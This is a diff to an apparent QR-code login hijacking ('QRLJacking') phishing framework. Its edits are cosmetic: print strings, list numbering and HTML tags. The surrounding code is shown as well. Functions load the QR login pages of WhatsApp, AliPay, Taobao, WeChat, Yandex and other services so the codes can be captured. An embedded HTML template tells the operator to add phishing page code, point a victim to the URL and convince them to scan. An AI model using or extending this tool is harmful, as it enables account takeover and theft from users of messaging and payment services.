@@ -85,7 +85,7 @@ def Screenshot(PicName ,location ,size):
 def whatsapp():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website.."
+	print " [*] Navigating To Website..."
 	driver.get('https://web.whatsapp.com/')
 	time.sleep(5)
 
@@ -117,7 +117,7 @@ def whatsapp():
 def Yandex():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website.."
+	print " [*] Navigating To Website..."
 	driver.get("https://passport.yandex.com/auth?mode=qr")
 	time.sleep(5)
 	while True:
@@ -139,7 +139,7 @@ def Yandex():
 def Airdroid():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website.."
+	print " [*] Navigating To Website..."
 	driver.get("http://web.airdroid.com")
 	time.sleep(5)
 	img_number = 16
@@ -174,7 +174,7 @@ def Airdroid():
 def Weibo():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website.."
+	print " [*] Navigating To Website..."
 	driver.get("http://weibo.com/login.php")
 	time.sleep(5)
 	while True:
@@ -197,7 +197,7 @@ def Weibo():
 def WeChat():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website.."
+	print " [*] Navigating To Website..."
 	driver.get("https://web.wechat.com")
 	time.sleep(5)
 	while True:
@@ -218,7 +218,7 @@ def WeChat():
 def AliPay():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website.."
+	print " [*] Navigating To Website..."
 	driver.get("https://auth.alipay.com/login/index.htm")
 	time.sleep(10)
 	while True:
@@ -252,7 +252,7 @@ def AliPay():
 def Taobao():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website.."
+	print " [*] Navigating To Website..."
 	driver.get("https://login.taobao.com")
 	time.sleep(5)
 	while True:
@@ -281,7 +281,7 @@ def Taobao():
 def mydigipass():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website.."
+	print " [*] Navigating To Website..."
 	driver.get("https://www.mydigipass.com/en/fp/signin/smartphone/qr")
 	time.sleep(5)
 	while True:
@@ -304,7 +304,7 @@ def mydigipass():
 def Zapper():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website.."
+	print " [*] Navigating To Website..."
 	driver.get("https://www.zapper.com/login.php")
 	time.sleep(5)
 	while True:
@@ -328,7 +328,7 @@ def Zapper():
 def Trustly_App():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website.."
+	print " [*] Navigating To Website..."
 	driver.get("https://trustlyapp.com/backend")
 	time.sleep(5)
 	while True:
@@ -349,7 +349,7 @@ def Trustly_App():
 def Yelophone():
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website.."
+	print " [*] Navigating To Website..."
 	driver.get("https://www.yelophone.com/app#/login")
 	time.sleep(5)
 	while True:
@@ -381,11 +381,11 @@ document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();
 }
 </script><center>
 <h1><b>Scan Me Please</b></h1>
-Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
-0. This is your *always updated """+str(service_name)+""" QR Code*
-<img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;">
-1. Edit me by adding your phishing page source code, style, resources, etc.. ( I'm the "Index.html" resides in the framework folder)
-2. Point your victim to your phishing <a href='http://localhost:'"""+str(port)+""" >URL</a>, Convince to scan the QR code and Bob is your uncle!
+Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:</b>
+1. This is your *always updated """+str(service_name)+""" QR Code*
+<img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;"></b>
+2. Edit me by adding your phishing page source code, style, resources, etc.. ( I'm the "Index.html" resides in the framework folder)</b>
+3. Point your victim to your phishing <a href='http://localhost:'"""+str(port)+"""'>URL</a>, Convince to scan the QR code and Bob is your uncle!
 </center>
 </body>
 </html>"""
@@ -404,11 +404,11 @@ document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();
 }
 </script><center>
 <h1><b>Scan Me Please</b></h1>
-Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
-0. This is your *always updated """+str(service_name)+""" QR Code*
-<img id="qrcodew" alt="Scan me!" src="tmp.svg" style="display: block;">
-1. Edit me by adding your phishing page source code, style, resources, etc.. ( I'm the "Index.html" resides in the framework folder)
-2. Point your victim to your phishing <a href='http://localhost:'"""+str(port)+""" >URL</a>, Convince to scan the QR code and Bob is your uncle!
+Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:</b>
+1. This is your *always updated """+str(service_name)+""" QR Code*
+<img id="qrcodew" alt="Scan me!" src="tmp.svg" style="display: block;"></b>
+2. Edit me by adding your phishing page source code, style, resources, etc.. ( I'm the "Index.html" resides in the framework folder)</b>
+3. Point your victim to your phishing <a href='http://localhost:'"""+str(port)+"""'>URL</a>, Convince to scan the QR code and Bob is your uncle!
 </center>
 </body>
 </html>"""
@@ -587,7 +587,7 @@ def Remove_website():
 def First_Method(classname,url,image_number,s=10):
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website.."
+	print " [*] Navigating To Website..."
 	driver.get(url)
 
 	while True:
@@ -610,7 +610,7 @@ def First_Method(classname,url,image_number,s=10):
 def Second_Method(url,image_number,s=10):
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website.."
+	print " [*] Navigating To Website..."
 	driver.get(url)
 	time.sleep(5)
 	while True:
@@ -633,7 +633,7 @@ def Second_Method(url,image_number,s=10):
 def Third_Method(url,image_number,s=10):
 	driver = create_driver()
 	time.sleep(5)
-	print " [*] Navigating To Website.."
+	print " [*] Navigating To Website..."
 	driver.get(url)
 	time.sleep(10)
 	while True:
